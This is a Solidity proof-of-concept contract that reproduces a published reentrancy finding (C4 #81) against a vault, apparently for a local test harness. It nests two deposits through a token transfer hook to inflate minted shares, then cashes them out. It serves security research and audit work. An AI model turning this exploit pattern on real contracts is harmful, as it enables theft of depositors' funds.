// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./HookToken.sol";
import "./IVaultLike.sol";

/// @notice Reproduces C4 #81: split one deposit into two nested (reentrant) deposits so the outer
/// mint uses a stale `balanceBefore` against an inflated `supply`. Demonstration only — the value
/// moved is confined to this local, disposable harness against the public, patched JPEG'd contract.
contract Attacker is IReentrancyHook {
    IVaultLike public immutable vault;
    HookToken public immutable token;
    uint256 public half;
    bool internal reentered;

    constructor(IVaultLike _vault, HookToken _token) {
        vault = _vault;
        token = _token;
    }

    function attack(uint256 amount) external {
        half = amount / 2;
        token.approve(address(vault), amount);
        token.arm(address(this));   // arm the one-shot reentrancy hook
        vault.deposit(half);        // outer deposit; the token hook re-enters once mid-transfer
    }

    function onTokenTransfer() external {
        if (!reentered) {
            reentered = true;
            vault.deposit(half);    // inner deposit, before the outer's tokens/mint settle
        }
    }

    function cashOut() external returns (uint256) {
        vault.withdraw(vault.balanceOf(address(this)));
        return token.balanceOf(address(this));
    }
}
